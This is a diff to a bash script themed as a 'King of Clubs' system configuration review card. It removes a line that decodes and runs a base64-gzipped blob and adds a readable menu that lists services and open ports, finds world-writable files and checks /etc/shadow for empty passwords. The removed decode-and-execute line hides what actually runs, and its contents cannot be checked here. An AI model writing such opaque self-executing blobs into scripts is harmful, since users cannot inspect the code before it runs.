@@ -1,1 +1,74 @@
-bash -c "$(echo H4sICF4iXGcAA0tpbmdfb2ZfQ2x1YnMAtVdhb9s2EP2uX3FVgznZILmO232wlwJB6gHFkC1IMgxDOwSMeLYJS6RKUnK9JP99R1F2LVtKm6ERkEAiqHf33r07yi9f9G+F7N8yMw+Cs79Pfz/pfXw1HH4YjIc/Z73gcnI1ua6XXtFzoLEUuLwxK2Mxu0mUnIpZoZkVSprDI7gLgK4kRaarO0zmCiKE8ODOgT+EX1ZDdwc33+/axb6Hnes3IWegpnCWFrdmBFcVBzjb5gCXFb/dN+F+D/w7Jr4Pvhf//18t4NdzYSBhmkOuVSk4GmC8ZDJBDlap1NB/8IUGJjn9sXT1L8JKFRp85bvBm5aAqdKQK4vSCpbCEtlCojEuIgFnwjS3x1/J/Fll+SOvchg9CzgMYjibY7KoFClkYUjs6k5iQoowvQKDuhT08HTw43htXJWjBIl2qfSChNfWK23nKDQwY1QimKXQHbHawIcxnNYOmIoUIUdNhTNVealjDEojrCgRuNCYWKVFB4U28NcxvENLr1XegJxSpNS5gcK4br04PYfDi7SYzdgthT4tiAhZKfHNeq54keJRJ/ibGCafhX1i9b4p82dqfz8qq6lLs7Ja18g4RDmEE2lR+yakrVS8EeXi7/zUZQbhwC+AkME6+cFRsM3Fk6i86BT+uh3jOA4bCH4EJDaFVBgbFVLYyDnDQBQZS/Y6QenKxakGM405RBPo1Uv3LHFe6bWkdC3yEbwTpqp0ndLGpkth5yMwBVdb4Xm9+Zd6241kGb5tJjsebx6P24TwfVOdDE9snX1dXHYE4DSAyBap7GJ5liqDDbF9PG/6KfXRkqUpaHK3iTv5DNv4+Fb1MN/YrO1EpoLI99Em0C+Zhr5WykJ/rjIkbquchgG5ktAhUj8tybifMQE6OqKUw90DfBx3clfaRW5kVvEekZkzxSvRaftS0lmSZfT0iASv2yTwA8VJ0DVT9hiLKXyAaAqhI9w3c8bVMoR/xq76zSpu9GHLBUS/jqB3eHAMJycQhvT5QyeqkBbCv7YD+x4j21DDHgzgoQdbUZr5pwb3onlSV9VuX1RJlZiqQvIY/qzayh3Y61N6Q3eH4lR0VWQiKUGaGcZqRfq0zeDGMU3DpWaASaGFXXXX501bfdxMdsCPfIDtIGq0hZZdQX5sC/JeliwVvB6Q7nx0EC4saZWhLPY8UCOiYUmwNe4vNLUoqbuCBa78l5FDcndkjiaUn9USBhCZ4CEIXpK2ptBUsU2jrz0NjJZZyUTqChg4iyQZd9J+mW/rWVK1IvltDFxVcciuL9ZIEJVkK3o3hB/eQp9j2ZdFmu5Yt1Zea0UuvMRPBbU/30D03Ps9oM9CZ61NVjG8l5QATSI6RKtZSATYjAm5JR26E3YQ1BbjSqLjfc4ck0SL3IIbDYUr7qO/HgL/q+E/mG7245EMAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+review_system_configurations() {
+    clear
+    echo -e "${CYAN}"
+    echo "     ___________________________________________________________________________"
+    echo "    |                King of Clubs: System Configuration Review                 |"
+    echo "    |___________________________________________________________________________|"
+    echo "    |                                                                           |"
+    echo "    | This card provides advanced tools to review and analyze your system       |"
+    echo "    | configurations for potential weaknesses and misconfigurations.            |"
+    echo "    |                                                                           |"
+    echo "    | Options:                                                                  |"
+    echo "    |  1. Check for unused or unnecessary services                              |"
+    echo "    |  2. Review open network ports and their associated services               |"
+    echo "    |  3. Analyze file permissions on sensitive directories                     |"
+    echo "    |  4. Detect weak passwords using PAM (Pluggable Authentication Module)     |"
+    echo "    |  5. Exit                                                                  |"
+    echo "    |___________________________________________________________________________|"
+    echo -e "${RESET}"
+
+    read -p "Enter your choice: " choice
+    case $choice in
+        1)
+            echo "Checking for unused or unnecessary services..."
+            systemctl list-unit-files --state=enabled | grep -E 'enabled|active'
+            echo "Tip: Disable unused services with: sudo systemctl disable <service_name>"
+            ;;
+        2)
+            echo "Reviewing open network ports and their associated services..."
+            sudo netstat -tuln
+            echo "Tip: Close unnecessary ports using firewall rules."
+            ;;
+        3)
+            echo "Analyzing file permissions on sensitive directories..."
+            sudo find /etc /var /root /home -type f -perm -o+w -exec ls -ld {} \;
+            echo "Tip: Correct permissions using: chmod and chown commands."
+            ;;
+        4)
+            echo "Detecting weak passwords using PAM..."
+            if [ -f "/etc/shadow" ]; then
+                sudo awk -F: '($2 == "") { print "Weak password for user: "$1 }' /etc/shadow
+            else
+                echo "Shadow file not found. Unable to analyze passwords."
+            fi
+            echo "Tip: Enforce strong passwords using PAM configuration in /etc/security."
+            ;;
+        5)
+            echo "Exiting System Configuration Review."
+            return
+            ;;
+        *)
+            echo "Invalid choice. Returning to menu..."
+            ;;
+    esac
+
+    echo "Press any key to return to the menu..."
+    read -n 1 -s
+}
+
+# Ensure necessary commands are available
+for cmd in systemctl netstat find awk; do
+    if ! command -v "$cmd" &> /dev/null; then
+        echo "Error: Required command '$cmd' is not available. Install it and try again."
+        exit 1
+    fi
+done
+
+# Main script execution
+review_system_configurations
+clear
